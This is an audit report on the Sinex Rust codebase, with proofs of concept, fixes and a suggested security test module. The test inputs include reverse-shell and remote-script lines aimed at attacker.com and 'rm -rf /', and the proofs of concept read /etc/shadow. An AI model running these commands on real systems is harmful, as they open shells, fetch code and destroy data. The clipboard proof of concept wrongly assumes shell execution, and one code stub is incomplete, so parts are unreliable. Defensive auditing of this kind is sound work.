# Sinex Security Audit Findings

## Executive Summary

This security audit of the Sinex codebase identified several vulnerabilities ranging from command injection to sensitive data exposure. While the codebase shows good security practices in some areas (e.g., SQL parameterization, path validation), there are critical issues that need immediate attention.

## Critical Vulnerabilities

### 1. Command Injection in Clipboard Module

**Location**: `crate/sinex-events/src/clipboard.rs`

**Vulnerability**: The clipboard module executes shell commands with user-controlled data without proper sanitization.

```rust
// Line 410-412 - Vulnerable code
let x_result = Command::new("xclip")
    .arg("-o")
    .args(x_selection.split_whitespace())  // Unsafe string splitting
    .output()
    .await;
```

**Proof of Concept**:
```rust
// Attacker sets x_selection to:
let malicious_selection = "-selection clipboard -o /etc/passwd; cat /etc/shadow #";
// This executes: xclip -o -selection clipboard -o /etc/passwd; cat /etc/shadow #
```

**Fix**:
```rust
// Use explicit args instead of split_whitespace
let x_result = match selection {
    "clipboard" => Command::new("xclip")
        .arg("-o")
        .arg("-selection")
        .arg("clipboard")
        .output()
        .await,
    "primary" => Command::new("xclip")
        .arg("-o")
        .arg("-selection")
        .arg("primary")
        .output()
        .await,
    _ => return Ok(String::new()),
};
```

### 2. Path Traversal in Git-Annex Integration

**Location**: `crate/sinex-annex/src/lib.rs`

**Vulnerability**: File paths passed to git-annex commands are not validated for directory traversal.

```rust
// Line 122-133 - Vulnerable code
pub async fn add_file(&self, file_path: &Path) -> Result<AnnexKey> {
    // No validation of file_path - could be ../../../../etc/passwd
    let output = AsyncCommand::new("git-annex")
        .arg("add")
        .arg(file_path)  // Direct use of user-provided path
        .current_dir(&self.config.repo_path)
        .output()
        .await
```

**Proof of Concept**:
```rust
// Attacker provides malicious path
let malicious_path = Path::new("../../../../../../../etc/passwd");
git_annex.add_file(&malicious_path).await?;
// This could add sensitive files to git-annex repository
```

**Fix**:
```rust
pub async fn add_file(&self, file_path: &Path) -> Result<AnnexKey> {
    // Validate path is within repo bounds
    let canonical_path = file_path.canonicalize()
        .context("Failed to canonicalize path")?;
    let repo_canonical = self.config.repo_path.canonicalize()
        .context("Failed to canonicalize repo path")?;
    
    if !canonical_path.starts_with(&repo_canonical) {
        anyhow::bail!("Path traversal detected: {:?}", file_path);
    }
    
    // Continue with validated path...
}
```

### 3. Log Injection Vulnerabilities

**Location**: Multiple files with logging statements

**Vulnerability**: User-controlled data is logged without sanitization, allowing log injection attacks.

Example from `crate/sinex-events/src/terminal.rs`:
```rust
// Line 151-155 - Vulnerable logging
debug!(
    window_id = window.id,
    command = %cmd.command_string,  // Unsanitized user input
    exit_code = cmd.exit_code,
    "New command detected"
);
```

**Proof of Concept**:
```bash
# Attacker executes command with newlines and fake log entries
$ echo -e "innocent\n2024-01-01 ERROR Authentication bypassed for admin\n2024-01-01 INFO User admin logged in"
```

**Fix**:
```rust
// Sanitize log output
debug!(
    window_id = window.id,
    command = %cmd.command_string.replace('\n', "\\n").replace('\r', "\\r"),
    exit_code = cmd.exit_code,
    "New command detected"
);
```

### 4. Sensitive Data in Logs

**Location**: Multiple event sources capture potentially sensitive data

**Examples**:
1. Terminal commands may contain passwords: `mysql -u root -pSecretPassword123`
2. Clipboard content may contain API keys, passwords
3. File paths may reveal sensitive project names

**Fix**: Implement sensitive data filtering:
```rust
fn redact_sensitive_data(input: &str) -> String {
    // Redact common password patterns
    let password_regex = regex::Regex::new(r"-p\S+|--password[= ]\S+").unwrap();
    let mut result = password_regex.replace_all(input, "-p[REDACTED]").to_string();
    
    // Redact API keys (common patterns)
    let api_key_regex = regex::Regex::new(r"(?i)(api[_-]?key|token|secret)[=:]\s*\S+").unwrap();
    result = api_key_regex.replace_all(&result, "$1=[REDACTED]").to_string();
    
    result
}
```

### 5. Time-of-Check Time-of-Use (TOCTOU) Vulnerability

**Location**: `crate/sinex-events/src/filesystem.rs`

**Vulnerability**: File metadata is checked after path validation, creating a race condition.

```rust
// Line 150-166 - TOCTOU vulnerability
notify::EventKind::Create(_) => {
    let metadata = std::fs::metadata(path).ok()?;  // File accessed after validation
    let payload = FileCreatedPayload {
        path: path.to_path_buf(),
        size: metadata.len(),
        // ...
    };
```

**Proof of Concept**:
```bash
# Attacker creates symlink after validation but before metadata read
# Thread 1: Sinex validates /tmp/safe_file
# Thread 2: rm /tmp/safe_file && ln -s /etc/shadow /tmp/safe_file
# Thread 1: Sinex reads metadata of /etc/shadow
```

**Fix**: Use file descriptors to prevent TOCTOU:
```rust
use std::fs::OpenOptions;

let file = OpenOptions::new()
    .read(true)
    .open(path)?;
let metadata = file.metadata()?;
```

### 6. Insufficient Input Validation for Shell Metacharacters

**Location**: `crate/sinex-core/src/validation.rs`

**Issue**: The `contains_shell_metacharacters` function doesn't catch all dangerous patterns.

Missing checks:
- Command substitution: `$(...)` is checked but not `` `...` ``
- Glob patterns that could cause DoS: `**/*/*/*/*/*`
- Unicode variants of dangerous characters

**Fix**:
```rust
pub fn contains_shell_metacharacters(s: &str) -> bool {
    const DANGEROUS_CHARS: &[char] = &[
        ';', '|', '&', '$', '`', '(', ')', '{', '}', 
        '<', '>', '\\', '\n', '\r', '\0', '*', '?', 
        '[', ']', '!', '~', '"', '\'', '=', '\t',
    ];
    
    // Check for various command substitution patterns
    s.contains("$(") || s.contains("${") || 
    s.contains('`') ||
    s.contains("$((") ||  // Arithmetic expansion
    s.chars().any(|c| DANGEROUS_CHARS.contains(&c)) ||
    // Check for excessive glob patterns (DoS)
    s.matches('*').count() > 10 ||
    s.matches("**").count() > 3
}
```

### 7. Weak ULID Generation for Cryptographic Purposes

**Location**: `crate/sinex-ulid/src/lib.rs`

**Issue**: ULIDs are predictable and should not be used for security-sensitive purposes.

```rust
// ULIDs contain timestamp - predictable component
pub fn new() -> Self {
    Self(ulid::Ulid::new())
}
```

**Recommendation**: For security-sensitive IDs, use cryptographically secure random generation:
```rust
use rand::{Rng, thread_rng};

pub fn new_secure() -> Self {
    let mut rng = thread_rng();
    let bytes: [u8; 16] = rng.gen();
    // Use fully random UUID v4 instead of ULID for security
}
```

## Medium Severity Issues

### 8. Missing Rate Limiting

Event sources can be flooded with events, causing resource exhaustion:
- Filesystem monitor has no rate limiting
- Clipboard monitor polls without backpressure
- No global rate limiting across event sources

### 9. Insufficient Error Message Sanitization

Error messages may leak sensitive information:
```rust
// From git-annex integration
anyhow::bail!("git-annex add failed: {}", String::from_utf8_lossy(&output.stderr));
```

This could expose internal paths, configuration details, etc.

### 10. Missing Security Headers in Configuration

The configuration system doesn't validate or sanitize values that might be used in security-sensitive contexts.

## Recommendations

### Immediate Actions
1. Fix command injection vulnerabilities in clipboard and git-annex modules
2. Implement comprehensive input validation for all external data
3. Add sensitive data filtering to all logging statements
4. Fix TOCTOU vulnerabilities using file descriptors

### Short-term Improvements
1. Implement rate limiting for all event sources
2. Add security-focused integration tests
3. Create a security configuration module
4. Implement log sanitization middleware

### Long-term Enhancements
1. Security audit of all external command execution
2. Implement principle of least privilege for file access
3. Add anomaly detection for suspicious event patterns
4. Create security monitoring dashboard

## Testing Recommendations

Create security-focused tests:
```rust
#[cfg(test)]
mod security_tests {
    use super::*;
    
    #[test]
    fn test_command_injection_prevention() {
        let dangerous_inputs = vec![
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
            "$(curl attacker.com/shell.sh | bash)",
            "`rm -rf /`",
        ];
        
        for input in dangerous_inputs {
            assert!(contains_shell_metacharacters(input));
        }
    }
    
    #[test]
    fn test_path_traversal_prevention() {
        let dangerous_paths = vec![
            "../../../etc/passwd",
            "/etc/passwd",
            "symlink_to_etc_passwd",
        ];
        
        for path in dangerous_paths {
            assert!(validate_path(path).is_err());
        }
    }
}
```

## Conclusion

While Sinex implements some security best practices, the identified vulnerabilities pose significant risks. The command injection and path traversal vulnerabilities are particularly critical and should be addressed immediately. The codebase would benefit from a security-first approach to input validation and a comprehensive security testing suite.